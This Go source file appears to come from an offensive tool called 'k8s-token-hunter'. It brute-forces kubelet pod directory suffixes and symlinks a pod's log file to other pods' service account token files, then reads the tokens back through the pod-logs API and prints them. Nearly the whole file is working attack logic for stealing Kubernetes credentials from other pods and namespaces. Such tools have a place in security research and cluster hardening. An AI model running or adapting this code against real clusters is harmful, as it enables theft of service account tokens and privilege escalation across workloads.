package internal

import (
	"bufio"
	"fmt"
	"k8s-token-hunter/model"
	"k8s-token-hunter/presenter"
	"log"
	"os"
	"path/filepath"

	"k8s-token-hunter/fileops"

	"github.com/schollz/progressbar/v3"
)

const (
	SaTokenPath         = "/var/run/secrets/kubernetes.io/serviceaccount/token"
	varLibKubeletPods   = "/var/lib/kubelet/pods/"
	srcPodKubeApiAccess = "/volumes/kubernetes.io~projected/kube-api-access-"
)

func resolveAPIServerAddr(kubernetesServiceHost string) string {
	// Fallback to the environment variable if the host isn't provided
	if kubernetesServiceHost == "" {
		return os.Getenv("KUBERNETES_SERVICE_HOST")
	}
	return kubernetesServiceHost
}

func presentPodInfo(kubeletPodsMapping *model.KubeletPodsSpec, dstPod *model.PodDestinationConfig) {
	presenter.CreateAndRenderTable(presenter.KubeletPodsSpecPresenter{KubeletPodsSpec: kubeletPodsMapping})
	presenter.CreateAndRenderTable(presenter.PodDestinationConfigPresenter{PodDestinationConfig: dstPod})
}

// ExecuteBruteForce attempts to find a valid token by brute-forcing suffix combinations againts /var/lib/kubelet/pods/*.
func ExecuteBruteForce(config *model.Config) []*model.Result {
	// edit config.hosstmountpath to include /pods...
	hostVarLogPods := filepath.Join(config.HostMountPath, "pods")
	varLogPodsFiles, err := fileops.MapFiles(hostVarLogPods)
	// varLogPodsFiles, err := fileops.MapFiles(config.HostMountPath)
	if err != nil {
		log.Fatalf("Error during command execution: %v\n", err)
	}

	kubeletPodsMapping, err := AssembleKubeletPodsList(varLogPodsFiles, config.TargetNamespace)
	if err != nil {
		log.Fatalf("Error during command execution: %v\n", err)
	}
	dstPod, err := FindAuthorizedPod(hostVarLogPods, varLogPodsFiles, config.ServiceAccountToken)
	if err != nil {
		log.Fatalf("Error during command execution: %v\n", err)
	}

	// Set the API server address
	dstPod.APIServerAddr = resolveAPIServerAddr(config.KubernetesServiceHost)

	presentPodInfo(kubeletPodsMapping, dstPod)

	// Attempt to brute-force the token using the provided suffix combinations
	return bruteForceToken(kubeletPodsMapping, dstPod, config.SuffixFilePath)
}

func bruteForceToken(kubeletPodsMapping *model.KubeletPodsSpec, dstPod *model.PodDestinationConfig, suffixCombPath string) []*model.Result {
	results := make([]*model.Result, 0)

	// Perform backup of the destination pod's log file
	originalPath, backupPath, err := fileops.PerformBackUp(dstPod.Path)
	if err != nil {
		log.Fatalf("Failed to backup the file: %v\n", err)
	}
	defer fileops.RestoreFile(backupPath, dstPod.Path)

	for i, kblPath := range kubeletPodsMapping.Paths {
		log.Printf("Checking Pod: %s, Namespace: %s, UUID: %s\n", kubeletPodsMapping.Pods[i], kubeletPodsMapping.Namespaces[i], kubeletPodsMapping.UUIDs[i])

		// Open the suffix combination file
		results, err = processSuffixFile(originalPath, backupPath, suffixCombPath, kblPath, dstPod, results)
		if err != nil {
			log.Printf("Failed to process suffix file: %v\n", err)
			return nil
		}
	}

	log.Println("\nRestoration complete for original path:", originalPath)
	return results
}

func processSuffixFile(originalPath, backupPath, suffixCombPath, kblPath string, dstPod *model.PodDestinationConfig, results []*model.Result) ([]*model.Result, error) {
	file, err := os.Open(suffixCombPath)
	if err != nil {
		return results, err
	}
	defer file.Close()

	fileInfo, err := file.Stat()
	if err != nil {
		log.Fatalf("Unable to stat the file: %v", err)
	}
	fileSize := fileInfo.Size()

	pb := progressbar.New64(fileSize)
	scanner := bufio.NewScanner(file)

	// Iterate over each line in the file, which contains a suffix.
	for scanner.Scan() {
		currSuffix := scanner.Text()

		// Construct the path using the current suffix and append the 'token' file name.
		tokenFilePath := filepath.Join(kblPath+currSuffix, "token")

		success, token, err := huntForToken(originalPath, backupPath, tokenFilePath, dstPod)
		if err != nil {
			continue
		}
		if success {
			// If the check is successful, create a Result and append it to the results slice.
			result := &model.Result{
				Pod:       dstPod.PodName,
				Namespace: dstPod.Namespace,
				Suffix:    currSuffix,
				Token:     token,
				Path:      tokenFilePath,
			}
			results = append(results, result)
			continue
		}
		// Increment progressbar
		pb.Add(len(scanner.Bytes()) + 2) // +2 for '\n' character
	}

	if err := scanner.Err(); err != nil {
		// Handle any errors that occurred during the scanning process.
		return results, err
	}

	// Check if progress bar is already at 100%, if not set it to 100%
	if !pb.IsFinished() {
		pb.Finish()
	}
	fmt.Println()

	fileops.RestoreFile(backupPath, backupPath)
	return results, nil
}

func huntForToken(originalPath, backupPath, tokenFilePath string, dstPod *model.PodDestinationConfig) (bool, string, error) {
	var err error
	originalPath, dstPod.LogFile, backupPath, err = updateLogFiles(
		originalPath,
		dstPod.LogFilePath,
		dstPod.LogFile,
		dstPod.Path,
		backupPath,
	)
	if err != nil {
		return false, "", fmt.Errorf("failed to update log files: %w", err)
	}
	dstPod.Path = filepath.Join(dstPod.LogFilePath, dstPod.LogFile)
	tmpDest := dstPod.Path

	tmpSymlinkPath := fileops.PerformSymLink(tokenFilePath, tmpDest)

	fileops.RestoreFile(tmpSymlinkPath, tmpDest)

	success, logs, err := RetrievePodLogs(dstPod)
	if err != nil {
		log.Printf("Failed to get pod logs: %v\n", err)
		return false, "", err
	}
	if success {
		log.Printf("Found a Token for file: %s\nToken: %s\n", tokenFilePath, logs[54:])
		return true, logs, nil
	}

	return false, "", nil

}
